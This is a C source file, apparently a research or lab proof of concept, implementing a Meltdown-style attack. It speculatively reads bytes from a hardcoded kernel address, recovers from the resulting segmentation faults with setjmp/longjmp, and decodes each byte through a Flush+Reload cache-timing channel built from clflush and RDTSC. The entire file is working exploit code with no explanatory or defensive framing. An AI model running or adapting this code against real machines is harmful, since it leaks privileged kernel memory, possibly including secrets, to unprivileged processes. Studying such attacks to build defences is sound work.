#include <setjmp.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

jmp_buf buf;
int samples = 100000;
void *target = (void *)(0xffff95ba223efa80);
FILE*resultFP;
char *resultFileName= "result.txt";

int space = 4096;
uint8_t * UserArray;
uint32_t threshold = 150;
int received_data=0;

void clflush(volatile void* Tx) {
    //asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
    asm volatile("lfence;clflush (%0);lfence;" :: "c" (Tx));

}

static __inline__ uint64_t timer_start (void) {
        unsigned cycles_low, cycles_high;
        asm volatile ("CPUID\n\t"
                    "RDTSC\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
                    "%rax", "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
        unsigned cycles_low, cycles_high;
        asm volatile("RDTSCP\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t"
                    "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
                    "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}
static __inline__ void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

uint32_t reload(void *target)
{
    volatile uint32_t time;
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(target);
    t2 = timer_stop();
    return t2 - t1;
}

//helper functions
static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}


//main function for recovering from a segmentation fault
int main(int argc, char** argv) {

    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("Failed to setup signal handler\n");
        return -1;
    }
    int nFault = 0;
    int count = 0;
    resultFP = fopen(resultFileName,"w");
    
    UserArray = (uint8_t *) malloc(space * 256);
    memset(UserArray, 0, 256 * space); // init to 0
    
    while(true){

        //flush all entries in UserArray
        for(int i = 0; i< 256; i++){
            clflush(&UserArray[i * space]);
        }

        if (!setjmp(buf)){
           //perform potentially invalid memory access
            
           asm volatile("1:\n"
              "movzx (%%rcx), %%rax\n" // read kernel data to a register
              "shl $12, %%rax\n" //multiply by 4K
              "jz 1b\n"
              "movq (%%rbx,%%rax,1), %%rbx\n"
              :: "c"(target), "b"(UserArray) //transimitor
              : "rax");
           
           //continue;
        }
        
        nFault++;
        
        //decode the value
        for(int k = 1; k< 256; k++){
            
            if (reload( &UserArray[k * space]) < threshold){
                received_data = k;
                break;
                
            }
        }
        
        if(received_data!=0){
                    
            printf("%c", received_data);
            received_data = 0;
            fflush(stdout); // clear the buffer and move the buffered data to stdout
            count++;
            target+=1;
        }
        if(count>32){
            break;
        }
    }
    free(UserArray);
    return 0;
    
}
